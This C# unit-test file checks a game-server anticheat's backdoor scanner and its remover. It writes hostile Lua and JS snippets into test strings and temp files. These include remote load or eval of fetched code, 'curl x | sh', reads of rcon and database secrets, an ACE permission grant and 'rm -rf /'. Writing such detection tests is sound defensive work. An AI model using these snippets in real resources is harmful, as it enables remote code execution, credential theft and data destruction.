using JcksAnticheat.Core.Backdoor;
using Xunit;

namespace JcksAnticheat.Core.Tests;

public class BackdoorTests
{
    private static List<Finding> Scan(string file, string text, ScanOptions? o = null)
        => BackdoorScanner.ScanText("res", file, "/tmp/" + file, text, o ?? new ScanOptions());

    [Fact]
    public void RemoteCodeExecutionInLuaIsHigh()
    {
        var f = Scan("server.lua", "PerformHttpRequest('https://example.invalid/p', function(code, body)\n  load(body)()\nend)\n");
        var hit = Assert.Single(f);
        Assert.Equal("LUA_REMOTE_LOAD", hit.Rule);
        Assert.Equal(Severity.High, hit.Severity);
        Assert.Equal(2, hit.Line);
    }

    [Fact]
    public void PlainHttpAndLoadElsewhereAreFine()
    {
        Assert.Empty(Scan("a.lua", "PerformHttpRequest(url, function(c, b) print(b) end)\n"));
        Assert.Empty(Scan("b.lua", "local cfg = load('return ' .. str)()\n"));
    }

    [Fact]
    public void JsEvalOfDownloadedCode()
        => Assert.Contains(Scan("s.js", "fetch(u).then(r => r.text()).then(t => {\n  eval(t);\n});\n"), x => x.Rule == "JS_REMOTE_EVAL");

    [Fact]
    public void ShellSecretsAceAndManifestWrites()
    {
        var f = Scan("x.lua", string.Join("\n",
            "os.execute('curl x | sh')",
            "local k = GetConvar('rcon_password', '')",
            "local db = GetConvar('mysql_connection_string', '')",
            "ExecuteCommand('add_ace identifier.license:abc command allow')",
            "SaveResourceFile(r, 'fxmanifest.lua', data, -1)",
            "-- os.execute('commented out')"));
        Assert.Equal(new[] { "ACE_GRANT", "MANIFEST_WRITE", "SECRET_CONVAR", "SHELL_EXEC" }, f.Select(x => x.Rule).OrderBy(x => x));
        Assert.Contains(Scan("y.js", "const cp = require('child_process');"), x => x.Rule == "SHELL_EXEC");
    }

    [Fact]
    public void EncodedPayloads()
    {
        var bytes = string.Concat(Enumerable.Repeat("\\x41", 80));
        var f = Scan("p.lua", $"local s = \"{bytes}\"\nload(string.char(112, 114, 105))()\n");
        Assert.Contains(f, x => x.Rule == "ENCODED_PAYLOAD");
        Assert.Contains(f, x => x.Rule == "LOAD_ENCODED");
    }

    [Fact]
    public void ObfuscatedJsAndHugeLines()
    {
        var js = string.Join(";", Enumerable.Range(0, 30).Select(i => $"var _0x{i + 4096:x4}=1"));
        Assert.Contains(Scan("o.js", js), x => x.Rule == "JS_OBFUSCATED");
        Assert.Contains(Scan("h.lua", "local x = '" + new string('a', 9000) + "'"), x => x.Rule == "HUGE_LINE");
    }

    [Fact]
    public void IgnoredIdsAndDisabledRulesAreSkipped()
    {
        var text = "os.execute('x')\n";
        var id = Assert.Single(Scan("i.lua", text)).Id;
        Assert.Empty(Scan("i.lua", text, new ScanOptions { IgnoreIds = { id } }));
        Assert.Empty(Scan("i.lua", text, new ScanOptions { DisabledRules = { "SHELL_EXEC" } }));
    }

    [Fact]
    public void ScanResourceWalksFilesAndRemoverWorks()
    {
        var root = Path.Combine(Path.GetTempPath(), "jac-bd-" + Guid.NewGuid());
        Directory.CreateDirectory(Path.Combine(root, "server"));
        try
        {
            var file = Path.Combine(root, "server", "main.lua");
            File.WriteAllText(file, "print('ok')\nos.execute('rm -rf /')\nprint('still ok')\n");
            File.WriteAllText(Path.Combine(root, "server", "escrowed.lua"), "FXAP\0\0binary");
            var findings = BackdoorScanner.ScanResource("victim", root, new ScanOptions());
            var f = Assert.Single(findings);
            Assert.Equal("server/main.lua", f.File);

            Assert.True(BackdoorRemover.RemoveLine(f, out _));
            Assert.Equal("print('ok')\nprint('still ok')\n", File.ReadAllText(file));
            Assert.True(File.Exists(file + ".jac-bak"));
            Assert.DoesNotContain(BackdoorScanner.ScanResource("victim", root, new ScanOptions()), x => x.File == "server/main.lua");

            File.WriteAllText(file, "io.popen('x')\n");
            var g = Assert.Single(BackdoorScanner.ScanResource("victim", root, new ScanOptions()), x => x.File == "server/main.lua");
            Assert.True(BackdoorRemover.Quarantine(g, root, out _));
            Assert.False(File.Exists(file));
            Assert.True(File.Exists(Path.Combine(root, ".jac-quarantine", "server", "main.lua")));
            Assert.Empty(BackdoorScanner.ScanResource("victim", root, new ScanOptions()));
        }
        finally { Directory.Delete(root, true); }
    }
}
